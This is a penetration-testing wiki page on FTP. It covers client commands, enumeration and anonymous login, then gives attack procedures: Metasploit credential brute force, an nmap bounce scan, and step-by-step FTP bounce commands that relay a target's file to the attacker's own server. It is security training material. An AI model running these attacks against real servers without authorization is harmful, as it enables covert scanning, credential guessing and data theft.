---
authors: ShutdownRepo
category: infra
---

# 🛠️ FTP

## Theory

The File Transfer Protocol (FTP) is a standard network protocol used for the transfer of files between a client and server. It usually runs on ports 21/tcp or 2121/tcp.

## Basic usage

Standard UNIX-like commands, like `cd`, `ls`, `mkdir`, `rm` can be used. Here is a short list of some specific commands.

| Command | Description |
| -------- | --------------------------------- |
| `help` | display local help information |
| `get` | download file from remote server |
| `put` | upload file on the remote server |
| `ascii` | set the transfer type to "ASCII" |
| `binary` | set the transfer type to "Binary" |
| `close` | terminate FTP session |
| `bye` | terminate ftp session and exit |

> [!TIP]
> When downloading files, users should set the FTP client to "Binary" (`binary` command) in order to prevent files from becoming corrupted during transit.
> 
> Regular text file can be downloaded in the other mode : "ASCII" (`ascii` command)

> [!TIP]
> Hidden files can be listed with `ls -a`

## Enumeration

### Banner grabbing

Useful to get basic information about the FTP server such as its type and version.

```bash
telnet -vn $IP $PORT
```

### Accepted commands

The `HELP` and `FEAT` commands could give information about the FTP server such as the recognized commands and the extended features the server supports.

```
HELP
214-The following commands are recognized (* =>'s unimplemented):
214-CWD XCWD CDUP XCUP SMNT* QUIT PORT PASV 
214-EPRT EPSV ALLO* RNFR RNTO DELE MDTM RMD 
214-XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
214-NOOP FEAT OPTS AUTH CCC* CONF* ENC* MIC* 
214-PBSZ PROT TYPE STRU MODE RETR STOR STOU 
214-APPE REST ABOR USER PASS ACCT* REIN* LIST 
214-NLST STAT SITE MLSD MLST 
214 Direct comments to root@drei.work
FEAT
211-Features:
 PROT
 CCC
 PBSZ
 AUTH TLS
 MFF modify;UNIX.group;UNIX.mode;
 REST STREAM
 MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;
 UTF8
 EPRT
 EPSV
 LANG en-US
 MDTM
 SSCN
 TVFS
 MFMT
 SIZE
211 End
```

### 🛠️ Files

[https://www.howtoforge.com/using-wget-with-ftp-to-download-move-web-sites-recursively](https://www.howtoforge.com/using-wget-with-ftp-to-download-move-web-sites-recursively)

## Connection

### Anonymous login

Some FTP servers are configured to let users connect anonymously and thus give them access to files on the servers without authentication.

```bash
$ ftp $IP $PORT
Name: anonymous
Password: 
ftp> ls -a # List all files (even hidden) (yes, they could be hidden)
ftp> ...
```

## Attacks

### Brute force

```bash
msfconsole
use auxiliary/scanner/ftp/ftp_login
set RHOSTS $IP
set RPORT $PORT
set USER_FILE $user.txt
set PASS_FILE $pass.txt
run
```

### FTP sniffing

If the FTP communications are not encrypted and if the attacker is on the same network of the client or the server he can sniff the data packet traveling between the client and the server in order to retrieve credential.

Several tools like `Wireshark` could be used to sniff TCP packets.

### FTP Bounce attacks

FTP Bounce attacks let an attacker requests access to ports by using the FTP command `PORT`. It's mostly used to make a port-scan without being detected (as you are not the one doing it, but the FTP server for you), for D.o.S. attacks, or to download files from another FTP server.

To check if the FTP server is vulnerable to Bounce attacks it is possible to use the tool `NMAP`.

> [!TIP]
> [https://nmap.org/nsedoc/scripts/ftp-bounce.html](https://nmap.org/nsedoc/scripts/ftp-bounce.html)

#### Scan the victim's network

If a FTP server is vulnerable to Bounce attacks, an attacker could use it to scan its network without being detected.

```bash
nmap -v -b -P0 'username':'password'@'ftp_server' 'address(es)_to_scan'
```

#### Download file/folder

If an attacker has access to a bounce FTP server, he can make it request files of other FTP server and download that file to his own server.

> [!CAUTION]
> Requirements:
> 
> * Valid credentials in the FTP intermediate server
> * Valid credentials in target FTP server
> * Both servers accept the PORT command
> * Write permissions in the intermediate server
> * Attacker's FTP server supports passive mode

#### Steps

* Connect to your own FTP server and make the connection passive to make it listen in a directory where the victim service will send the file.

```bash
#Start server + connection
service pure-ftpd start
ftp My_IP 21
ftp> USER my_own_username
#Enable passive mode
ftp> pasv
Entering Passive Mode (F,F,F,F,X,X) #Note the output (IP and port)
#Tells server to accept data and to store it into the dump file
ftp> stor dump
```

* Create the file to send to the intermediate server with the commands that the targeted server will have to execute. Let's call this file `instrs`.

```bash
user ftp # user and pass of the targeted server
pass -anonymous@
cwd /DIRECTORY
type i
port F,F,F,F,X,X #IP and port of the attacker
retr file.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```

> [!TIP]
> The extra nulls at the end of the command file are to fill up the TCP windows and ensure that the command connection stays open long enough for the whole session to be executed.

* Upload this file on the intermediate server, then upload it from the intermediate server to the targeted server and __make the targeted machine execute this file. 

```bash
#Run these commands on the intermediate server
put instrs
quote "port C,C,C,C,0,21" #IP of the targeted server
quote "retr instrs"
```

* The attacker should have received on his server the file 'file.tar.Z' renamed as 'dump'. 

## Resources

[https://book.hacktricks.xyz/pentesting/pentesting-ftp](https://book.hacktricks.xyz/pentesting/pentesting-ftp)

[https://shahmeeramir.com/penetration-testing-of-an-ftp-server-19afe538be4b](https://shahmeeramir.com/penetration-testing-of-an-ftp-server-19afe538be4b)

[https://www.thesecuritybuddy.com/vulnerabilities/what-is-ftp-bounce-attack/](https://www.thesecuritybuddy.com/vulnerabilities/what-is-ftp-bounce-attack/)

[https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands](https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands)